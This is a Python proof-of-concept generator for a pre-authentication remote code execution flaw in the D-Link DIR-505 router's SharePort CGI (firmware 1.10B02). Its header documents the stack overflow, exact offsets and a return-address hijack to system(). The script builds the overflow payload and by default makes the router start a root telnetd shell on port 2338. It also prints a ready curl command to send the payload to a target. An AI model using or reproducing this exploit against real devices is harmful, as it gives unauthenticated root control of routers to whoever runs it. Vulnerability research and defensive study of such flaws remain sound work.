#!/usr/bin/env python3
"""
DIR-505 A1 FW 1.10B02 — SharePort webfile_cgi.cgi pre-auth RCE PoC generator

Vulnerability:
  main() -> get_input_entries()              (0x408e3c)
  POST body parser with stride 1061, key at +0, value at +36, entry base = 1061*index.
  No bounds checks -> overwrites main()'s saved $s0-$s4 / $ra.

Stack layout (verified with QEMU user-mode + gdb):
  v17 (input buffer, 53052 bytes) at main_frame + 0x2C
    +53052 : saved $s0
    +53056 : saved $s1
    +53060 : saved $s2
    +53064 : saved $s3
    +53068 : saved $s4
    +53072 : saved $ra    <- hijacked -> .system PLT stub (0x40d180)

Chain:
  1) first field  "x=0<cmd>"        -> at main's return $a0 = &value[36]+1 = "<cmd>"
                                       (uClibc strcmp increments $a0 in the branch delay slot)
  2) 49 x '&'                       -> advance the parser to entry index 49
  3) "a=" + 1051-byte value:
        [0]         0x00            -> make replace_special_char() return immediately
        [1..1026]   filler 'A'
        [1027..1046] $s0..$s4       (junk)
        [1047..1050] $ra = 0x40d180 (.system PLT stub -> system($a0))
  Result: system(cmd) runs as root (the CGI is executed by lighttpd-ws as root).

Command constraints:
  raw '&', '=', '%' must NOT appear in <cmd> (the form parser splits fields and the
  post-processor decodes %xx sequences). Encode them as %26 / %3D / %25; they are
  decoded in place by replace_special_char() before the command is executed:
      '&' -> "%26"     '=' -> "%3D"     '%' -> "%25"

Usage:
  python3 gen_poc.py [--ra 0x40d180] [--out file] "<command>"
  (without arguments, a default telnetd payload is generated)

Verified:
  - QEMU user-mode + gdb: PC=RA=0xdeadbeef, $s0-$s4 fully controlled
  - Emulated device (FirmAE, real firmware): root telnetd shell on port 2338
"""
import struct
import sys

# .system PLT stub in /usr/bin/webfile_cgi.cgi (1.10B02)
# disasm: lw $t9,-0x7ff0($gp); move $t7,$ra; jalr $t9; li $t8,0x9c
SYSTEM_STUB = 0x40D180
JUNK = [0x11111111, 0x22222222, 0x33333333, 0x44444444, 0x55555555]
FILLER = 0x41  # 'A'

def build(cmd: bytes, ra: int = SYSTEM_STUB) -> bytes:
    """Build the URL-encoded POST body that triggers the overflow and runs `cmd`."""
    v = bytearray([FILLER]) * 1051
    v[0] = 0  # NUL -> replace_special_char() sees an empty string and returns
    for i, j in enumerate(JUNK):
        v[1027 + 4 * i:1031 + 4 * i] = struct.pack(">I", j)
    v[1047:1051] = struct.pack(">I", ra)
    return b"x=0" + cmd + b"&" * 49 + b"a=" + bytes(v)

if __name__ == "__main__":
    args = sys.argv[1:]
    ra = SYSTEM_STUB
    out = "poc.bin"
    cmd_parts = []
    i = 0
    while i < len(args):
        if args[i] == "--ra":
            ra = int(args[i + 1], 16); i += 2
        elif args[i] == "--out":
            out = args[i + 1]; i += 2
        else:
            cmd_parts.append(args[i]); i += 1
    cmd = cmd_parts[0].encode() if cmd_parts else \
        b"telnetd -p 2338 -l /bin/sh </dev/null >/dev/null 2>%261 %26 kill -9 $PPID"
    body = build(cmd, ra=ra)
    open(out, "wb").write(body)
    print(f"[+] wrote {out}: {len(body)} bytes, $ra=0x{ra:08x}")
    print(f"[+] cmd = {cmd!r}")
    print(f"[+] send: curl -s -X POST 'http://<target>:8181/dws/api/ListRoot' "
          f"-H 'Content-Type: application/x-www-form-urlencoded' --data-binary @{out}")
